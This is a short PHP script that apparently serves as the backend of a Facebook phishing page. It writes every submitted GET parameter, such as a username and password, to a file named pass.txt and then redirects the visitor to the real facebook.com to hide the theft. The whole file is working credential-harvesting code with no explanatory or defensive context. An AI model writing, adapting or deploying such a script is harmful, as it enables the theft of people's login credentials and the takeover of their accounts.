<?php
header ('Location: https://www.facebook.com  ');
$handle = fopen("pass.txt", "a");
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r||");
}
fwrite($handle, "\r||");
fclose($handle);
exit;
?>
